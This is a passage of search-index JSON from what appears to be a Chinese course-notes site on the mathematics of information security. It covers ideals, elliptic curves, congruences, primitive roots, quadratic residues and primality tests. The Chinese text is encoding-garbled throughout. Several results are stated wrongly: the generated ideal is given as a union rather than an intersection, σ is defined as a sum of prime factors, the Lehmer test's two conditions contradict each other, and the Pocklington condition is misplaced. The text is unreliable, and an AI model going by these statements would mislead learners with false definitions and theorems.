çš„éç©ºå­é›†ï¼Œ$$(H_i | i \\in N)$$ æ˜¯ R çš„æ‰€æœ‰åŒ…å«é›†åˆ H çš„ç†æƒ³ï¼Œå³ $$H \\subseteq H_i (i \\in N)$$ã€‚ åˆ™è€ƒè™‘é›†åˆ $$\\cup_{i \\in N} H_i$$ ç§°ä½œç”±å­é›† H ç”Ÿæˆçš„ç†æƒ³ï¼Œè®°åš (H)ï¼ŒH ä¸­çš„å…ƒç´ ç§°ä½œç†æƒ³ (H) çš„ç”Ÿæˆå…ƒã€‚ ç”±ä¸€ä¸ªå…ƒç´ ç”Ÿæˆçš„ç†æƒ³ (a) ç§°ä½œä¸»ç†æƒ³ã€‚  å®šä¹‰ï¼ˆä¸»ç†æƒ³ç¯ï¼‰ï¼š\n å¦‚æœäº¤æ¢ç¯ $$(R, +, \\cdot)$$ çš„æ‰€æœ‰ç†æƒ³éƒ½æ˜¯ä¸»ç†æƒ³ï¼Œåˆ™äº¤æ¢ç¯ R ç§°ä¸ºä¸»ç†æƒ³ç¯ã€‚  å•†ç¯ #  å®šç†ï¼š\n è®¾ $$(R, +, \\cdot)$$ ä¸ºäº¤æ¢ç¯ï¼ŒH æ˜¯å®ƒçš„ç†æƒ³ï¼Œå†è®¾ T æ˜¯åŠ æ³•ç¾¤ (R, +) å…³äºå…¶å­ç¾¤ (H, +) çš„æ‰€æœ‰ä¸åŒé™ªé›†ç»„æˆçš„é›†åˆï¼Œå³å•†ç¾¤ $$T = R/H = {a + H | a \\in R}$$ï¼Œåˆ™ $$(R, \\oplus, \\odot)$$ æ„æˆäº¤æ¢ç¯ã€‚  $$(a + H) \\oplus (b + H) = (a+b) + H$$ $$(a + H) \\odot (b + H) = (a \\cdot b) + H$$    "},{"id":225,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/18.%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/","title":"18.æ¤­åœ†æ›²çº¿","section":"ä¿¡æ¯å®‰å…¨æ•°å­¦åŸºç¡€","content":"æ¤­åœ†æ›²çº¿ #  ä»¿å°„å¹³é¢ä¸å°„å½±å¹³é¢ #  å®šä¹‰ï¼ˆä»¿å°„å¹³é¢ï¼‰ï¼š\n åŸŸ K ä¸Šçš„é›†åˆ $$K^2 = {(x, y) | x, y \\in K}$$ ç§°ä¸ºåŸŸ K ä¸Šçš„ä»¿å°„å¹³é¢ï¼Œ$$K^2$$ ä¸Šçš„å…ƒç´ ç§°ä¸ºä»¿å°„å¹³é¢ä¸Šçš„ç‚¹ï¼Œå¯ä»¥ç”¨ä»¿å°„åæ ‡ (x, y) è¡¨ç¤ºã€‚  "},{"id":226,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/19.%E5%9F%9F%E4%B8%8A%E7%9A%84%E4%B8%80%E5%85%83%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%8E%AF/","title":"19.åŸŸä¸Šçš„ä¸€å…ƒå¤šé¡¹å¼ç¯","section":"ä¿¡æ¯å®‰å…¨æ•°å­¦åŸºç¡€","content":"åŸŸä¸Šçš„ä¸€å…ƒå¤šé¡¹å¼ç¯ #  ä¸€å…ƒå¤šé¡¹å¼çš„æ•´é™¤ #  å®šä¹‰ï¼š\n å¦‚æœ $$f(x), g(x) \\in K$$ ä¸å…¨ä¸ºé›¶å¤šé¡¹å¼ï¼Œä¸” $$d(x) \\in K, d(x) \\not= 0$$ã€‚ è‹¥ $$d(x) | f(x)$$ ä¸” $$d(x) | g(x)$$ï¼Œåˆ™ç§° d(x) ä¸º g(x) ä¸ f(x) çš„  "},{"id":227,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/2.%E6%95%B4%E9%99%A4/","title":"2.æ•´é™¤","section":"ä¿¡æ¯å®‰å…¨æ•°å­¦åŸºç¡€","content":"æ•´é™¤ #  æ¦‚å¿µå’Œæ€§è´¨ #  å®šä¹‰ï¼ˆæ•´é™¤ï¼‰ï¼š\n è®¾ $$a, b \\in \\mathbb{Z}, b \\neq 0.$$ å¦‚æœ $$\\exist q \\in \\mathbb{Z}, s.t. a = qb.$$ é‚£ä¹ˆå°±ç§° b æ•´é™¤ aï¼Œæˆ– a è¢« b æ•´é™¤ï¼Œè®°ä½œ $$b | a.$$  å®Œå…¨æ•°ã€æ¢…æ£®ç´ æ•°å’Œè´¹é©¬ç´ æ•° #  Basic #  è´¹å°”é©¬ç´ æ•°å’Œæ¢…æ£®ç´ æ•°çš„ç ”ç©¶éƒ½åŸºäºè¿™æ ·ä¸€ä¸ªé‡è¦çš„å› å¼åˆ†è§£ï¼š\n  $$\\displaystyle 2^{st} - 1 = (2^s - 1)(\\sum_{i=1}^{t} 2^{s(t-i)})$$\n  è‹¥ t ä¸ºå¥‡æ•°ï¼š$$\\displaystyle 2^{st} + 1 = (2^s + 1)(\\sum_{i = 1}^{t}(-1)^{i+1} 2^{s(t-i)})$$\n  Concept #  å®šä¹‰ï¼ˆå®Œå…¨æ•°ï¼‰ï¼š\n å¦‚æœä¸€ä¸ªæ­£æ•´æ•° N çš„æ‰€æœ‰æ­£å› å­ä¹‹å’Œä¸º 2Nï¼Œåˆ™ N ç§°ä¸ºå®Œå…¨æ•°ã€‚ $$\\sigma(a)$$ è¡¨ç¤º a çš„ç´ å› å­ä¹‹å’Œã€‚  å®šç†ï¼š\n è‹¥æ­£æ•´æ•° n çš„æ ‡å‡†åˆ†è§£å¼ $$\\displaystyle n = p_1^{a_1} p_2^{a_2} \u0026hellip; p_s^{a_s}$$ åˆ™ï¼š$$\\displaystyle \\sigma(n) = \\frac{p_1^{a_1 + 1} - 1}{p_1 - 1}\u0026hellip;\\frac{p_s^{a_s + 1} - 1}{p_s - 1}$$  å®šç†ï¼š\n è‹¥ $$2^n -1$$ æ˜¯ç´ æ•°ï¼Œåˆ™ $$2^{n-1} (2^n - 1)$$ æ˜¯å¶å®Œå…¨æ•°ï¼Œä¸”æ‰€æœ‰å¶å®Œå…¨æ•°å‡å¯ä»¥ç”¨è¿™ç§å½¢å¼è¡¨ç¤ºã€‚  å®šç†ï¼š\n è‹¥ $$2^n - 1$$ ä¸ºç´ æ•°ï¼Œåˆ™ n å¿…ä¸ºç´ æ•°ã€‚  å®šä¹‰ï¼ˆæ¢…æ£®æ•°ï¼‰ï¼š\n è®¾ p æ˜¯ä¸€ä¸ªç´ æ•°ï¼Œå½¢å¦‚ $$2^p - 1$$ çš„æ•°å«åšæ¢…æ£®æ•°ï¼Œè®°ä¸º $$M_p = 2^p - 1$$ï¼Œå½“ $$M_p$$ ä¸ºç´ æ•°æ—¶ï¼Œåˆ™ç§°å…¶ä¸ºæ¢…æ£®ç´ æ•°ã€‚  å®šç†ï¼š\n è‹¥ $$2^m + 1$$ ä¸ºç´ æ•°ï¼Œåˆ™ $$m = 2^n$$  å®šä¹‰ï¼ˆè´¹é©¬æ•°ï¼‰ï¼š\n è‹¥ n ä¸ºéè´Ÿæ•°ï¼Œåˆ™ç§° $$F_n = 2^{2^n} + 1$$ ä¸ºè´¹é©¬æ•°ã€‚å½“ $$F_n$$ ä¸ºç´ æ•°æ—¶ï¼Œåˆ™ç§°å…¶ä¸ºè´¹é©¬ç´ æ•°ã€‚  "},{"id":228,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/3.%E5%90%8C%E4%BD%99/","title":"3.åŒä½™","section":"ä¿¡æ¯å®‰å…¨æ•°å­¦åŸºç¡€","content":"åŒä½™ #  æ¦‚å¿µå’Œæ€§è´¨ #  å®šä¹‰ï¼ˆåŒä½™ï¼‰ï¼š\n ç»™å®šä¸€ä¸ªæ­£æ•´æ•° mï¼Œå¦‚æœç”¨ m å»é™¤ä¸¤ä¸ªæ•´æ•° a å’Œ b æ‰€å¾—åˆ°çš„ä½™æ•°ç›¸åŒï¼Œåˆ™ç§° a å’Œ b æ¨¡ m åŒä½™ï¼š$$a \\equiv b \\pmod{m}$$ã€‚å¦åˆ™ï¼Œç§° a å’Œ b æ¨¡ m ä¸åŒä½™ï¼Œè®°ä½œ $$a \\not\\equiv b \\pmod{m} $$  å®šç†ï¼š\n æ•´æ•° a å’Œæ•´æ•° b æ¨¡ m åŒä½™ $$\\Leftrightarrow m | (a - b)â€‹$$  å®šç†ï¼š\n  è®¾ $$a_1, a_2, b_1, b_2 \\in \\mathbb{Z}$$ï¼Œå¦‚æœæœ‰ï¼š$$a_1 \\equiv b_1 \\pmod{m}, a_2 \\equiv b_2 \\pmod{m}$$\n  $$a_1 x + a_2 x \\equiv b_1 y + b_2 y \\pmod{m}, \\text{where }x, y \\in \\mathbb{Z}$$\n  $$a_1 a_2 \\equiv b_1 b_2 \\pmod{m}$$\n  $$a_1^n \\equiv b_1^n \\pmod{m}. \\text{where }n \u0026gt; 0$$\n    å³åœ¨æ¨¡ m çš„æ•°åŸŸå†…ï¼Œæ»¡è¶³åŠ æ³•ã€ä¹˜æ³•å’ŒæŒ‡æ•°å¾‹ã€‚\n  å®šç†ï¼š\n è®¾ $$\\displaystyle f(t) = \\sum_{i = 0}^n a_i t^i\\text{ and }g(t) = \\sum_{j=0}^{n} b^i t$$ æ˜¯ä¸¤ä¸ªæ•´ç³»æ•°å¤šé¡¹å¼ï¼Œæ»¡è¶³ $$a_i \\equiv b_i \\pmod{m}, 0 \\le i \\le n$$ å¦‚æœæœ‰ $$x \\equiv y \\pmod{m}$$ï¼Œåˆ™ $$f(x) \\equiv g(y) \\pmod{m}$$  å®šç†ï¼š\n è‹¥ $$ac \\equiv bc \\pmod{m}$$ï¼Œä¸” $$gcd(c, m) = d$$ï¼Œåˆ™ï¼š$$\\displaystyle a \\equiv b \\pmod{\\frac{m}{d}}$$  å®šç†ï¼š\n  è‹¥ $$a \\equiv b \\pmod{m}$$ï¼Œä¸”æœ‰æ­£æ•´æ•° d æ»¡è¶³ $$d | m$$ï¼Œåˆ™ï¼š$$a \\equiv b \\pmod{d}$$\n NOTEï¼šæ¨¡æ•°åŒ–ç®€å®šç†\n   å®šç†ï¼š\n  è‹¥ $$a \\equiv b \\pmod{m_i}, i = 1, 2, \u0026hellip;, n$$ï¼Œåˆ™ï¼š$$a \\equiv b \\pmod{lcm(m_1, m_2, \u0026hellip;, m_n)}$$\n NOTEï¼šæ¨¡æ•°åˆå¹¶å®šç†\n   å‰©ä½™ç±»å’Œæ¬§æ‹‰å®šç† #  å®šä¹‰ï¼ˆå‰©ä½™ç±»ï¼‰ï¼š\n  è®¾ m æ˜¯ä¸€ä¸ªç»™å®šçš„æ­£æ•´æ•°ï¼Œä»¤ $$C_r$$ è¡¨ç¤ºæ‰€æœ‰ä¸æ•´æ•° r æ¨¡ m åŒä½™çš„æ•´æ•°æ‰€ç»„æˆçš„é›†åˆï¼Œåˆ™ä»»æ„è¿™æ ·çš„ $$C_r$$ å«åšæ¨¡ m çš„ä¸€ä¸ªå‰©ä½™ç±»ï¼Œä¸€ä¸ªå‰©ä½™ç±»ä¸­çš„ä»»ä¸€æ•´æ•°å«åšè¯¥ç±»çš„ä»£è¡¨å…ƒã€‚\n  æˆ–å¯ä»¥ç”¨é›†åˆçš„å½¢å¼æ¥æè¿°å‰©ä½™ç±»çš„å®šä¹‰ï¼š\n$$C_r = {a | a \\in \\mathbb{Z}, a \\equiv r \\pmod{m}}$$\n  å®šä¹‰ï¼ˆå®Œå…¨å‰©ä½™ç³»ï¼‰ï¼š\n åœ¨æ¨¡ m çš„å‰©ä½™ç±» $$C_0, C_1, \u0026hellip;, C_{m-1}$$ ä¸­å„å–ä¸€ä»£è¡¨å…ƒ $$a_i \\in C_i, i = 0, 1, \u0026hellip;, m-1$$ï¼Œåˆ™æ­¤ m ä¸ªæ•°ç»„æˆçš„é›†åˆç§°ä¸ºæ¨¡ m çš„ä¸€ä¸ªå®Œå…¨å‰©ä½™ç³»ï¼ˆåˆç§°å®Œç³»ï¼‰ã€‚  å®šä¹‰ï¼ˆæ¬§æ‹‰å®šç†ï¼‰ï¼š\n   "},{"id":229,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/4.%E6%AC%A1%E6%95%B0/","title":"4.æ¬¡æ•°","section":"ä¿¡æ¯å®‰å…¨æ•°å­¦åŸºç¡€","content":"æ¬¡æ•° #  æ¦‚å¿µä¸æ€§è´¨ #  å®šä¹‰ï¼ˆæ¬¡æ•°ï¼‰ï¼š\n è®¾ m æ˜¯å¤§äº 1 çš„æ•´æ•°ï¼Œa æ˜¯ä¸ m äº’ç´ çš„æ•´æ•°ï¼Œä½¿ $$a^l \\equiv 1 \\pmod{m}$$ æˆç«‹çš„æœ€å°æ­£æ•´æ•° l å«åš a å¯¹æ¨¡ m çš„æ¬¡æ•°ã€‚è®°ä½œ $$ord_m(a)$$ æˆ– $$\\sigma(a)$$  "},{"id":230,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/5.%E5%8E%9F%E6%A0%B9/","title":"5.åŸæ ¹","section":"ä¿¡æ¯å®‰å…¨æ•°å­¦åŸºç¡€","content":"åŸæ ¹ #  æ¦‚å¿µä¸æ€§è´¨ #  å®šä¹‰ï¼ˆåŸæ ¹ï¼‰ï¼š\n è®¾ m æ˜¯å¤§äº 1 çš„æ•´æ•°ï¼Œa æ˜¯ä¸ m äº’ç´ çš„æ•´æ•°ï¼Œè‹¥ $$ord_m(a) = \\phi(m)$$ï¼Œåˆ™ a å«åš m çš„åŸæ ¹ã€‚  å®šç†ï¼š\n a æ˜¯ m çš„åŸæ ¹çš„å……è¦æ¡ä»¶æ˜¯ $$1, a, a^2, \u0026hellip;, a^{\\phi(m)-1}$$ æ˜¯æ¨¡ m çš„ä¸€ä¸ªç¼©ç³»ã€‚  å®šç†ï¼š\n  è®¾ a æ˜¯ m çš„ä¸€ä¸ªåŸæ ¹ï¼Œt æ˜¯éè´Ÿæ•´æ•°ï¼Œåˆ™ $$a^t$$ ä¹Ÿæ˜¯ m çš„åŸæ ¹çš„å……è¦æ¡ä»¶æ˜¯ $$gcd(t, \\phi(m)) = 1$$\n  è‹¥ a æ˜¯ m çš„åŸæ ¹ï¼Œåˆ™ m æ°æœ‰ $$\\phi(\\phi(m))$$ ä¸ªæ¨¡ m ä¸åŒä½™çš„åŸæ ¹ã€‚\n  å®šç†ï¼š\n è‹¥ p æ˜¯å¥‡ç´ æ•°ï¼Œåˆ™ p çš„åŸæ ¹å­˜åœ¨  å®šç†ï¼š\n è®¾ m æ˜¯å¤§äº 1 çš„æ•´æ•°ï¼Œåˆ™ m çš„åŸæ ¹å­˜åœ¨çš„å……è¦æ¡ä»¶æ˜¯ m ä¸º $$2, 4, p^l, 2p^l$$ ä¹‹ä¸€ï¼Œå…¶ä¸­ $$l \\ge 1,$$ p æ˜¯å¥‡ç´ æ•°ã€‚  å®šç†ï¼š\n è®¾ m æ˜¯å¤§äº 2 çš„æ•´æ•°ï¼Œ$$\\phi(m)$$ çš„æ‰€æœ‰å› å­æ˜¯ $$q_1, q_2, \\dots, q_s$$ï¼Œåˆ™ä¸ m äº’ç´ çš„æ­£æ•´æ•° g æ˜¯ m çš„ä¸€ä¸ªåŸæ ¹çš„å……è¦æ¡ä»¶æ˜¯ $$\\displaystyle g^{\\frac{\\phi(m)}{q_i}} \\not\\equiv 1 \\pmod{m}, i = 1, 2, \\dots, s$$  "},{"id":231,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/6.%E6%8C%87%E6%95%B0/","title":"6.æŒ‡æ•°","section":"ä¿¡æ¯å®‰å…¨æ•°å­¦åŸºç¡€","content":"æŒ‡æ•° #  æ¦‚å¿µä¸æ€§è´¨ #  å®šä¹‰ï¼ˆæŒ‡æ•°ï¼‰ï¼š\n  è®¾ m æ˜¯å¤§äº 1 çš„æ•´æ•°ï¼Œg æ˜¯ m çš„ä¸€ä¸ªåŸæ ¹ï¼Œa æ˜¯ä¸ m äº’ç´ çš„æ•´æ•°ï¼Œåˆ™å­˜åœ¨å”¯ä¸€çš„éè´Ÿæ•´æ•° rï¼Œ$$0 \\le r \\lt \\phi(m)$$ï¼Œæ»¡è¶³ $$g^r \\equiv a \\pmod{m}$$ã€‚äºæ˜¯ï¼Œæˆ‘ä»¬æŠŠ r å«åšä»¥ g ä¸ºåº• a å¯¹æ¨¡ m çš„æŒ‡æ•°ï¼Œè®°ä½œ $$ind_g a$$ã€‚\n  æ˜¾ç„¶æ ¹æ®å®šä¹‰ï¼Œæˆ‘ä»¬æœ‰ $$a \\equiv g^{ind_g a} \\pmod{m}$$ã€‚æœ‰æ—¶ï¼Œä¹ŸæŠŠæŒ‡æ•°ç§°ä½œç¦»æ•£å¯¹æ•°ã€‚\n  å®šç†ï¼š\n g æ˜¯ m çš„ä¸€ä¸ªåŸæ ¹ï¼Œa æ˜¯ä¸ m äº’ç´ çš„æ•´æ•°ï¼Œå¦‚æœéè´Ÿæ•´æ•° k ä½¿å¾—åŒä½™å¼ $$g^k \\equiv a \\pmod{m}$$ æˆç«‹ï¼Œåˆ™æœ‰ k æ»¡è¶³ï¼š$$k \\equiv ind_g a \\pmod{\\phi(m)}$$  "},{"id":232,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/7.%E4%BA%8C%E6%AC%A1%E5%89%A9%E4%BD%99/","title":"7.äºŒæ¬¡å‰©ä½™","section":"ä¿¡æ¯å®‰å…¨æ•°å­¦åŸºç¡€","content":"äºŒæ¬¡å‰©ä½™ #  é«˜æ¬¡å‰©ä½™ #  å®šä¹‰ï¼š\n é«˜æ¬¡å‰©ä½™ï¼šè®¾ m æ˜¯å¤§äº 1 çš„æ•´æ•°ï¼Œa æ˜¯ä¸ m äº’ç´ çš„æ•´æ•°ï¼Œè‹¥ $$n (n \\ge 2)$$ æ¬¡åŒä½™æ–¹ç¨‹ $$x^n \\equiv a \\pmod{m}$$ æœ‰è§£ï¼Œåˆ™ a å«åšæ¨¡ m çš„ n æ¬¡å‰©ä½™ã€‚å¦åˆ™ï¼Œa å«åšæ¨¡ m çš„ n æ¬¡éå‰©ä½™ã€‚  å®šç†ï¼š\n g æ˜¯ m çš„ä¸€ä¸ªåŸæ ¹ï¼Œa æ˜¯ä¸ m äº’ç´ çš„æ•´æ•°ã€‚ åˆ™åŒä½™æ–¹ç¨‹ $$x^n \\equiv a \\pmod{m}$$ æœ‰è§£çš„å……è¦æ¡ä»¶æ˜¯ $$gcd(n, \\phi(m)) | ind_g a$$ï¼Œå¹¶ä¸”å¦‚æœæœ‰è§£ï¼Œå…¶è§£çš„ä¸ªæ•°æ°å¥½ä¸º $$gcd(n, \\phi(m))$$  å®šç†ï¼š\n g æ˜¯ m çš„ä¸€ä¸ªåŸæ ¹ï¼Œa æ˜¯ä¸ m äº’ç´ çš„æ•´æ•°ã€‚ åˆ™ a æ˜¯æ¨¡ m çš„ n æ¬¡å‰©ä½™çš„å……è¦æ¡ä»¶æ˜¯ $$\\displaystyle a^{\\frac{\\phi(m)}{d}} \\equiv 1 \\pmod{m}, d = gcd(n, \\phi(m))$$  äºŒæ¬¡å‰©ä½™ #  å®šä¹‰ï¼š\n è®¾ m æ˜¯å¤§äº 1 çš„æ•´æ•°ï¼Œa æ˜¯ä¸ m äº’ç´ çš„æ•´æ•°ï¼Œè‹¥ $$x^2 \\equiv a \\pmod{m}$$ æœ‰è§£ï¼Œåˆ™ a å«åšæ¨¡ m çš„äºŒæ¬¡å‰©ä½™ï¼Œæˆ–å¹³æ–¹å‰©ä½™ï¼›å¦åˆ™ï¼Œa å«åšæ¨¡ m çš„äºŒæ¬¡éå‰©ä½™ã€‚  å®šç†ï¼ˆäºŒæ¬¡å‰©ä½™çš„æ¬§æ‹‰åˆ¤åˆ«æ¡ä»¶ï¼‰ï¼š\n è®¾ p æ˜¯å¥‡ç´ æ•°ï¼Œ$$gcd(a, p) = 1$$ï¼Œåˆ™å¯¹äºåŒä½™æ–¹ç¨‹ $$x^2 \\equiv a \\pmod{p}$$  a æ˜¯æ¨¡ p çš„äºŒæ¬¡å‰©ä½™çš„å……è¦æ¡ä»¶æ˜¯ $$a^{\\frac{p-1}{2}} \\equiv 1 \\pmod{p}$$ a æ˜¯æ¨¡ p çš„äºŒæ¬¡éå‰©ä½™çš„å……è¦æ¡ä»¶æ˜¯ $$a^{\\frac{p-1}{2}} \\equiv -1\\pmod{p}$$   å¹¶ä¸”å½“ a æ˜¯æ¨¡ p çš„äºŒæ¬¡å‰©ä½™æ—¶ï¼ŒåŒä½™æ–¹ç¨‹æ°æœ‰ä¸¤ä¸ªè§£ã€‚  å®šç†ï¼š\n è®¾ p æ˜¯å¥‡ç´ æ•°ï¼Œåˆ™æ¨¡ p çš„ç¼©ç³»ä¸­äºŒæ¬¡å‰©ä½™ä¸éäºŒæ¬¡å‰©ä½™çš„ä¸ªæ•°å„ä¸º $$\\displaystyle \\frac{p - 1}{2}$$ï¼Œä¸” $$\\displaystyle \\frac{p - 1}{2}$$ ä¸ªäºŒæ¬¡å‰©ä½™åˆ†åˆ«ä¸åºåˆ— $$\\displaystyle 1^2, 2^2, \\cdots, (\\frac{p - 1}{2})^2$$ ä¸­çš„ä¸€ä¸ªæ•°åŒä½™ï¼Œä¸”ä»…ä¸ä¸€ä¸ªæ•°åŒä½™ã€‚  å‹’è®©å¾·ç¬¦å· #  å®šä¹‰ï¼š\n è®¾ p æ˜¯å¥‡ç´ æ•°ï¼Œ$$gcd(a, p) = 1$$ï¼Œå®šä¹‰å‹’è®©å¾·ç¬¦å·å¦‚ä¸‹ï¼š $$\\displaystyle (\\frac{a}{p}) = \\begin{cases} 1 \u0026amp; \\text{è‹¥ a æ˜¯æ¨¡ p çš„äºŒæ¬¡å‰©ä½™} \\ -1 \u0026amp; \\text{è‹¥ a æ˜¯æ¨¡ p çš„äºŒæ¬¡éå‰©ä½™} \\end{cases}$$  å®šç†ï¼š\n è®¾ p æ˜¯å¥‡ç´ æ•°ï¼Œa æ˜¯ä¸ p äº’ç´ çš„æ•´æ•°ã€‚ åˆ™ï¼š$$\\displaystyle (\\frac{a}{p}) \\equiv a^{\\frac{p-1}{2}} \\pmod{p}$$  å®šç†ï¼š\n è®¾ p æ˜¯å¥‡ç´ æ•°ï¼Œa æ˜¯ä¸ p äº’ç´ çš„æ•´æ•°ã€‚åˆ™ï¼š  è‹¥ $$a \\equiv b \\pmod{p}$$ï¼Œåˆ™ï¼š$$\\displaystyle (\\frac{a}{p}) = (\\frac{b}{p})$$ $$\\displaystyle (\\frac{ab}{p}) = (\\frac{a}{p})(\\frac{b}{p})$$ $$\\displaystyle \\frac{a^2}{p} = 1$$    å®šç†ï¼š\n è‹¥ p æ˜¯å¥‡ç´ æ•°ï¼Œæˆ‘ä»¬æœ‰ $$\\displaystyle (\\frac{-1}{p}) = (-1)^{\\frac{p-1}{2}} = \\begin{cases} 1 \u0026amp; \\text{è‹¥ } p \\equiv 1 \\pmod{4} \\ -1 \u0026amp; \\text{è‹¥ } p \\equiv 3\\pmod{4}\\end{cases}$$  å®šç†ï¼ˆé«˜æ–¯å¼•ç†ï¼‰ï¼š\n è®¾ p æ˜¯å¥‡ç´ æ•°ï¼Œa æ˜¯ä¸ p äº’ç´ çš„æ•´æ•° å¦‚æœä¸‹åˆ— $$\\displaystyle \\frac{p-1}{2}$$ ä¸ªæ•´æ•°ï¼š$$\\displaystyle a \\cdot 1, a \\cdot 2, a \\cdot 3, \\cdots, a \\cdot \\frac{p-1}{2}$$ï¼Œæ¨¡ p åå¾—åˆ°æœ€å°çš„æ­£å‰©ä½™ä¸­å¤§äº $$\\displaystyle \\frac{p}{2}$$ çš„ä¸ªæ•°æ˜¯ m åˆ™ï¼š$$\\displaystyle (\\frac{a}{p}) = (-1)^m$$  å®šç†ï¼š\n è®¾ p æ˜¯å¥‡ç´ æ•°ï¼Œåˆ™æœ‰ï¼š $$\\displaystyle (\\frac{2}{p}) = (-1)^{\\frac{p^2 -1}{8}} = \\begin{cases} 1 \u0026amp; \\text{è‹¥ } p \\equiv \\pm 1 \\pmod{8} \\ -1 \u0026amp; \\text{è‹¥ } p \\equiv \\pm 3 \\pmod{8}\\end{cases}$$  å®šç†ï¼ˆäºŒæ¬¡äº’åå¾‹ï¼‰ï¼š\n è®¾ p, q æ˜¯å¥‡ç´ æ•°ï¼Œ$$p \\not= qâ€‹$$ï¼Œåˆ™ï¼š$$\\displaystyle (\\frac{p}{q})(\\frac{q}{p}) = (-1)^{\\frac{p-1}{2}\\frac{q-1}{2}}â€‹$$  é›…å¯æ¯”ç¬¦å· #  å®šä¹‰ï¼š\n è®¾å¥‡æ­£æ•° $$m = p_1 p_2 \\cdots p_r$$ æ˜¯å¥‡ç´ æ•° $$p_i (i = 1, 2, \\cdots, r)$$ çš„ä¹˜ç§¯ï¼Œå®šä¹‰é›…å¯æ¯”ï¼ˆJacobiï¼‰ç¬¦å·å¦‚ä¸‹ï¼š $$\\displaystyle (\\frac{a}{m}) = (\\frac{a}{p_1})(\\frac{a}{p_2})\\cdots(\\frac{a}{p_r})$$  "},{"id":233,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/8.%E6%95%B0%E8%AE%BA%E5%BA%94%E7%94%A8/","title":"8.æ•°è®ºåº”ç”¨","section":"ä¿¡æ¯å®‰å…¨æ•°å­¦åŸºç¡€","content":"æ•°è®ºçš„åº”ç”¨ #  ç´ æ€§æ£€éªŒç®—æ³• #  ç¡®å®šæ€§ç´ æ€§æ£€éªŒ #  Lucas ç´ æ€§æ£€éªŒï¼š\n å¦‚æœå­˜åœ¨æ•´æ•° aï¼Œä½¿å¾— $$a^{n-1} \\equiv 1 \\pmod{n}$$ï¼Œå¹¶ä¸”å¯¹ n-1 çš„ä»»æ„ç´ å› å­ pï¼Œ$$a^{\\frac{n-1}{p}} \\not\\equiv 1 \\pmod{n}$$ æˆç«‹ï¼Œé‚£ä¹ˆ n æ˜¯ç´ æ•°ã€‚  Lehmer ç´ æ€§æ£€éªŒï¼š\n å¦‚æœå¯¹ n-1 çš„ä»»æ„ç´ å› å­ $$p_i$$ï¼Œéƒ½å­˜åœ¨ä¸€ä¸ªæ•´æ•° $$a_i$$ï¼Œä½¿å¾— $$a_i^{n-1} \\equiv 1 \\pmod{n}$$ ä¸ $$a_i^{n-1} \\not\\equiv 1 \\pmod{n}$$ æˆç«‹ï¼Œé‚£ä¹ˆ n æ˜¯ç´ æ•°ã€‚  Pocklington ç´ æ€§æ£€éªŒï¼š\n å¯¹ n-1 åšä¸å®Œå…¨å› å­åˆ†è§£ï¼Œå¾—åˆ° $$n-1 =mj$$ï¼Œå…¶ä¸­æœ‰æ ‡å‡†åˆ†è§£å¼ $$m =p_1^{k_1}\u0026hellip;p_r^{k_r}, m \\ge \\sqrt{n}, gcd(m, j) = 1$$ã€‚å¦‚æœå¯¹äºæ¯ä¸ª $$p_i (1 \\le i \\le r)$$ï¼Œéƒ½å­˜åœ¨ä¸€ä¸ªæ•´æ•° $$a_i$$ï¼Œä½¿å¾— $$a_i^{n-1} \\equiv 1 \\pmod{n}, gcd(a_i^{\\frac{n-1}{p_i} - 1}, n) = 1$$ï¼Œé‚£ä¹ˆ n æ˜¯ç´ æ•°ã€‚  éšæœºæ€§ç´ æ€§æ£€éªŒ #   å¼•ç†ï¼š$$\\displaystyle x^2 \\equiv 1 \\bmod{p} \\Leftrightarrow x = \\begin{cases} 1 \u0026amp; \\bmod{p} \\ -1 \u0026amp; \\bmod{p}\\end{cases}$$\n ç¡®å®šæ€§ç´ æ€§æ£€æµ‹ç®—æ³•æ—¶é—´å¤æ‚åº¦è¾ƒé«˜ï¼Œå¤§éƒ¨åˆ†åº•å±‚åº“ä¸­ä¸€èˆ¬ä½¿ç”¨ Rabin-Miller ç®—æ³•ã€‚\nè€ƒè™‘ä¸‹é¢çš„ç»“è®ºï¼š\n å‡è®¾ p æ˜¯ä¸€ä¸ªå¤§äº 2 çš„ç´ æ•°ï¼Œäºæ˜¯ p-1 æ˜¯ä¸€ä¸ªå¶æ•°ï¼Œè®¾ $$p - 1 = 2^s * d$$ï¼Œå…¶ä¸­ s 